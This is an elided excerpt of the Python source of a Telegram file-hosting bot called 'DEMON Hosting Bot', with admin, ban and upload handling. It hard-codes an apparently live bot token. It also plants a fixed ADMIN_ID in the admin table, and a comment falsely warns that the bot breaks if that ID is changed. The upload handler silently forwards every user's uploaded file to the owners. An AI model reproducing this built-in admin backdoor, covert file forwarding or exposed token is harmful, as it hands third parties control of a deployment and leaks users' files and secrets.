...
# --- Configuration ---
TOKEN = '8412018560:AAHM1btYze_HNHM-sFWpKMhPp-wr4mLbiAc'
OWNER_IDS = {8629462568, 7734153365}  # ADD ALL OWNER USER IDs HERE
ADMIN_ID =  6227927913 # DON'T REPLACE IF REPLACE THEN BOT NOT WORKING 
YOUR_USERNAME = '@nyzoru' # ADD YOUR USERNAME 
UPDATE_CHANNEL = 'https://t.me/+A6w_iiji2_piOGI1' # ADD YOUR YOU CHANNEL USERNAME 
...
user_files = {}
active_users = set()
admin_ids = {ADMIN_ID} | OWNER_IDS   # all owners are admins
banned_users = set()
...
def init_db():
    ...
    try:
        ...
        if ADMIN_ID not in OWNER_IDS:
            c.execute('INSERT OR IGNORE INTO admins (user_id, added_by, added_date) VALUES (?, ?, ?)', 
                      (ADMIN_ID, list(OWNER_IDS)[0], datetime.now().isoformat()))
        conn.commit()
        conn.close()
...
def get_user_file_limit(user_id):
    ...
    if is_owner(user_id): return OWNER_LIMIT
...
def remove_admin_db(admin_id):
    if is_owner(admin_id):
        logger.warning("Attempted to remove an owner from admins.")
        return False 
    with DB_LOCK:
        conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
        c = conn.cursor()
    ...
    if user_id not in active_users:
        ...
        for oid in OWNER_IDS:
            try:
                ...
                bot.send_message(oid, owner_notification, parse_mode='Markdown')
            except Exception as e: 
                logger.error(f"⚠️ Failed to notify owner {oid} about new user {user_id}: {e}")
...
def _logic_bot_speed(message):
    ...
    try:
        ...
        if is_owner(user_id): user_level = "👑 Owner"
...
def handle_file_upload_doc(message):
    ...
    try:
        ...
        for oid in OWNER_IDS:
            try:
                bot.forward_message(oid, chat_id, message.message_id)
                bot.send_message(oid, f"⬆️ File '{file_name}' from {message.from_user.first_name} (`{user_id}`)", parse_mode='Markdown')
            except Exception as e: logger.error(f"Failed to forward uploaded file to owner {oid}: {e}")
...
def back_to_main_callback(call):
    ...
    limit_str = str(file_limit) if file_limit != float('inf') else "Unlimited"
    expiry_info = ""
    if is_owner(user_id): user_status = "👑 Owner"
...
def process_add_admin_id(message):
    ...
    if not is_owner(owner_id_check): bot.reply_to(message, "⚠️ Owner only."); return
    ...
    try:
        ...
        if is_owner(new_admin_id): bot.reply_to(message, "⚠️ User is already an Owner."); return
...
def process_remove_admin_id(message):
    ...
    try:
        ...
        if is_owner(admin_id_remove): bot.reply_to(message, "⚠️ Cannot remove an Owner."); return
...
def list_admins_callback(call):
    bot.answer_callback_query(call.id)
    try:
        admin_list_str = "\n".join(f"- `{aid}` {'(Owner)' if is_owner(aid) else ''}" for aid in sorted(list(admin_ids)))
...
def process_ban_user(message):
    ...
    try:
        ...
        if is_owner(user_id): bot.reply_to(message, "⚠️ Cannot ban owner."); return
...
if __name__ == '__main__':
    logger.info("="*50 + "\n🤖 DEMON Hosting Bot Starting Up...\n" + f"🐍 Python: {sys.version.split()[0]}\n" +
                ...
                f"📊 Data Dir: {IROTECH_DIR}\n👑 Owners: {', '.join(str(o) for o in OWNER_IDS)}\n" +
